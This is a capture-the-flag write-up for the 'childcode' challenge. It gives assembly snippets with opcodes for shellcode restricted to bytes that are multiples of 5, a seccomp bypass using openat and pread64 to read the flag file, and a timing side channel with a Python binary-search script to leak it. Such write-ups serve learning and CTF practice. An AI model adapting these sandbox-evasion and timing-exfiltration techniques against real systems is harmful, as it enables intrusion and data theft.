# Childcode

This challenge is probably the only challenge that I enjoyed throughout the CTF although I complicated it really much, if it is not an unoriginal challenge.

## 1. Challenge Overview
The "childcode" challenge presents an extremely restrictive x86-64 environment designed to prevent standard shellcoding. The constraints are as follows:

*   **Modulo-5 Constraint:** Every byte of the shellcode must be a multiple of 5 (e.g., `0x00, 0x05, 0x0A...`). This restricts available opcodes and immediate values.
*   **Register Poisoning:** All general-purpose registers except `RIP` are initialized to `0xDEADBEEFFACEB00C`. Since `RSP` is invalid, the stack is unusable (no `push`/`pop`).
*   **Seccomp Sandbox:** A strict filter blocks `execve`, `execveat`, `open`, `read`, `write`, `sendto`, `recvfrom`, `sendfile`, `brk`, `mprotect`, `mmap`, `munmap`, `mremap`.
*   **Size Limit:** Shellcode cannot exceed 4089 bytes.

## 2. Exploitation Strategy
This solution relies on recovering register control through restricted math and bypassing the I/O isolation using a Timing Side-Channel. There has to be easier methods as mentioned by others in the discord channels, in fact we could:
1. Recover a valid address for RSP so `push` or `pop` instructions will be usable.
2. `read` / `write` instructions via `stdin` / `stdout` respectively is usable.

### A. Register Recovery & Shared Memory
Since the stack is unavailable, the shellcode uses **System V Shared Memory** (`shmget`/`shmat`) to create a stable, known memory region.
1.  **Clearing Registers:** The script uses `IMUL` with a 0-immediate (`69 fa 00 00 00 00`) to zero out poisoned registers like `EDI` and `EDX`.
2.  **Constant Generation:** Values are loaded into `ECX` via `MOV`, swapped into `EAX` via `XCHG`, and adjusted to target values using `DEC EAX` (`ff c8`) and `ADD EAX, 5` (`05 05 00 00 00`) to stay Modulo-5 compliant. Note I am too late to discover `ADD EAX, 5` instruction and in fact I could use `ADD` instructions to reduce the length when crafting `EAX` to be `0x300` during setting the value of `RDI` in `pread64`.
3.  **Memory Allocation:** The script allocates and attaches a shared memory segment at `0x23b4a000` to provide a reliable 4-byte buffer for the flag. This value is carefully selected so that each byte is of multiple of 5 and it can be easily computed by multiplications of multiples of 5 (`130 * 160 * 160 * 180 = 0x23b4a000`). Also we couldn't easily craft 8-byte addresses.

### B. Seccomp Bypass (ORW via Alternatives)
Standard ORW (Open/Read/Write) is blocked, so the shellcode uses:
*   **`openat` (257):** Opens the flag file. By using the absolute path `/flag`, the script avoids the need for a valid directory file descriptor in `RDI` as `-100`.
*   **`pread64` (17):** Reads the flag into the shared memory segment at `0x23b4a000`.

### C. Timing Side-Channel Leak
Direct output (stdout) is isolated. Instead, the flag is leaked character-by-character using a timing attack:
1.  **`xlatb`:** Loads a flag byte into `AL` based on the shared memory address stored in `RBX`.
2.  **Comparison:** The code compares the byte in `AL` against a test value sent by the exploit script.
3.  **The Hang:** If the flag byte is greater than the test value, the shellcode enters an infinite loop (`JA` to itself). 
4.  **Inference:** The Python wrapper monitors the process. If it times out ("Forever is over!"), the script infers that the character value is higher than the tested threshold.

## 3. Implementation Details

### ASM Snippet: Modulo-5 Arithmetic
- To set `RCX`
```nasm
mov ecx, 20       ; Opcode: b9 14 00 00 00
```

- To set `RAX` to 17 (`pread64`), we cannot move 17 directly. Instead:
```nasm
b9 14 00 00 00    ; mov ecx, 20 (multiple of 5)
91                ; xchg ecx, eax
ff c8             ; dec eax (19)
ff c8             ; dec eax (18)
ff c8             ; dec eax (17)
0f 05             ; syscall (0x0F and 0x05 are both multiples of 5)
05 55 05 00 00    ; add eax, 0x0555   - also as a sample alternative to above
```

- To set `RBX`
```nasm
xchg ebx, eax     ; Opcode: 87 c3
```

- Controlling EDI / EDX (4-byte only)
Using `IMUL` and `cmovno edi, edx` and we can also control the lower 2 bytes of `RDX` via `xor`.
```nasm
; Zero out EDI using EDX as a source
imul edi, edx, 0    ; Opcode: 69 fa 00 00 00 00

; Zero out EDX using EDI as a source
imul edx, edi, 0    ; Opcode: 69 d7 00 00 00 00

mov ecx, 130        ; Opcode: b9 00 82 00 00
xchg ecx, eax       ; Opcode: 91
xchg ebx, eax       ; Opcode: 87 c3
xor dl, bh          ; Opcode: 32 d7     Control lowest byte of RDX by XOR

imul edi, edx, 160  ; Opcode: 69 fa a0 00 00 00
imul edx, edi, 160  ; Opcode: 69 d7 a0 00 00 00
imul edi, edx, 180  ; Opcode: 69 fa b4 00 00 00

; Also could control dh if needed
xor dh, al          ; Opcode: 32 f0

; Below is useful for setting EDI, since we can first manipulate the lowest 2 bytes of RDX register from above xors, then copied from EDX to EDI
cmovno edi, edx     ; Opcode: x0f 41 fa    Set edi = edx, as long as overflow flag is not set
```

- Controlling RSI (Large Address Load, max 4 bytes)
To load a 4-byte address, load it into ECX first and use XCHG (0x91 and 0x96) to move it to ESI.
```nasm
; Load ESI with 0x23b4a000
mov ecx, 0x23b4a000 ; Opcode: b9 00 a0 b4 23
91                  ; xchg ecx, eax
96                  ; xchg esi, eax
```

- Move `EAX` to `EDI`

I can only do so if `EAX` < 256. I wrote a loop so that `EBX` is incremented by `0x0100` per `EAX` counter decrease until it reaches 0. Then the 2nd lowest byte of `EBX` would be the value of `EAX` and I can use `xor dl, bh` to set `EDX = EAX`. Finally I could do `cmovno edi, edx` to finish `EDI = EAX`. For detail asm, refer to `code2` section in `exploit.py`

## 4. Binary Search Automation
The flag is recovered efficiently using a binary search algorithm in Python that triggers the shellcode's timing loop:

```python
from subprocess import run, PIPE

def binary_search(char_idx, l, r):
    if l == r-1 or l == r:
        return r
    m = (l+r)//2
    p = run(['python', 'exploit.py', str(char_idx), str(m)], stdout=PIPE)
    if b'Forever is over' in p.stdout:
        return binary_search(char_idx, m, r)
    return binary_search(char_idx, l, m)

flag = 'flag{'
for char_idx in range(len(flag), 50):
    l = 32
    r = 127
    c = binary_search(char_idx, l, r)
    flag += chr(c)
    print(flag)
    if flag[-1] == '}':
        break
```